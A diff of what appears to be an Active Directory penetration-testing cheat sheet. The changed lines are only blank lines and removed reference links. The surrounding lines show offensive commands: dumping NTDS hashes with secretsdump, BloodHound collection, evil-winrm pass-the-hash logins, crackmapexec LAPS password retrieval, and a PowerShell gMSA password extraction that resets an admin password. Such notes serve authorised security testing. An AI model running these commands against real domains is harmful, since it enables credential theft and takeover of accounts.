@@ -47,6 +47,7 @@ secretsdump.py -system <system_hive> -ntds <database_file> LOCAL
 - [https://github.com/k4sth4/SeBackupPrivilege](https://github.com/k4sth4/SeBackupPrivilege)
 
 
+
 # BloodHound
 This is used to visualise AD environments and discover attack paths.
 
@@ -69,6 +70,8 @@ bloodhound-python -u <username> -p <password> -d <domain> -c All -ns <nameserver
 - [https://github.com/fox-it/BloodHound.py](https://github.com/fox-it/BloodHound.py)
 - [https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html](https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html)
 
+
+
 # Evil-WinRM
 Allows remote login to WinRM, if credentials are known.
 
@@ -83,6 +86,8 @@ evil-winrm -i <ip> -u <user> -H <hash>
 # With private key and cert
 evil-winrm -i <ip> -S -k <private_key> -c <certificate>
 ```
+
+
 
 # LAPS
 LAPS allows you to manage the local Administrator password (which is randomised, unique, and changed regularly) on domain-joined computers. These passwords are centrally stored in Active Directory and restricted to authorised users using ACLs. Passwords are protected in transit from the client to the server using Kerberos v5 and AES       
@@ -115,10 +120,7 @@ crackmapexec ldap <ip> -u <user> -p <password> -d <domain> -M laps
 crackmapexec smb <ip> -u <user> -p <password> --laps
 ```
 
-### References
-- [https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/laps)
-- [https://www.crackmapexec.wiki/smb-protocol/defeating-laps](https://www.crackmapexec.wiki/smb-protocol/defeating-laps)
-- [https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps](https://www.infosecmatter.com/crackmapexec-module-library/?cmem=ldap-laps)s
+
 
 
 # GMSA and ReadGMSAPassword
@@ -143,9 +145,3 @@ $SecPass = (ConvertFrom-ADManagedPasswordBlob $mp).SecureCurrentPassword
 $cred = New-Object System.Management.Automation.PSCredential <user>, $SecPass
 Invoke-Command -ComputerName 127.0.0.1 -ScriptBlock {Set-ADAccountPassword -Identity <admin_user> -reset -NewPassword (ConvertTo-SecureString -AsPlainText 'PASSWORD' -force)} -Credential $cred
 ```
-
-### References
-- [https://aadinternals.com/post/gmsa/](https://aadinternals.com/post/gmsa/)
-- [https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/](https://www.dsinternals.com/en/retrieving-cleartext-gmsa-passwords-from-active-directory/)
-- [https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password](https://0xdf.gitlab.io/2022/04/30/htb-search.html#get-password)
-- [https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0](https://learn.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectoryrights?view=windowsdesktop-7.0)
